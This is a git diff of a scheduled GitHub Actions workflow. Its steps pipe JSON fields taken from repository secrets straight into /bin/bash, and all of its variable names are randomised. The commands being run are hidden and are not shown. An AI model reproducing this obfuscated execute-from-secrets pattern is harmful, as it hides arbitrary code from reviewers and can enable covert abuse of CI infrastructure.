@@ -3,32 +3,21 @@ name: bigouxiao
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
-
+    - cron: '12 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bigouxiao
         env:
-          jqojw692: ${{ secrets.jqojw692 }}
+          mug15308: ${{ secrets.mug15308 }}
         run: |
-          echo $jqojw692 | jq -r .x9016 | /bin/bash
-          echo $bjllt83 | jq -r .i9 | /bin/bash
-          echo $fvks859 | jq -r .jifed4290 | /bin/bash
-          echo $deg6 | jq -r .lgeib3 | /bin/bash
-          echo $ajux6 | jq -r .yowfd07834 | /bin/bash
-          echo $rv74 | jq -r .soaqh16812 | /bin/bash
-          echo $e6497 | jq -r .brr7 | /bin/bash
-          echo $dhcl2 | jq -r .nu40335 | /bin/bash
-          echo $udhu234 | jq -r .jaq21602 | /bin/bash
-          echo $pn84084 | jq -r .tbuz39 | /bin/bash
-          echo $s172 | jq -r .ya6 | /bin/bash
-          echo $qq70090 | jq -r .idsl8 | /bin/bash
-          echo $e661 | jq -r .pliqd8 | /bin/bash
-          echo $qjwz7002 | jq -r .hp56 | /bin/bash
-          echo $taraa31135 | jq -r .zqgn718 | /bin/bash
-          echo $r5 | jq -r .aalmu57975 | /bin/bash
-          echo $a4636 | jq -r .shz05 | /bin/bash
+          echo $mug15308 | jq -r .akhfc83 | /bin/bash
+          echo $qzhog6873 | jq -r .beh8232 | /bin/bash
+          echo $r4 | jq -r .rjfjt3791 | /bin/bash
+          echo $hfe8354 | jq -r .o61 | /bin/bash
+          echo $nan852 | jq -r .qbhf6966 | /bin/bash
+          echo $di290 | jq -r .kfb39 | /bin/bash
 
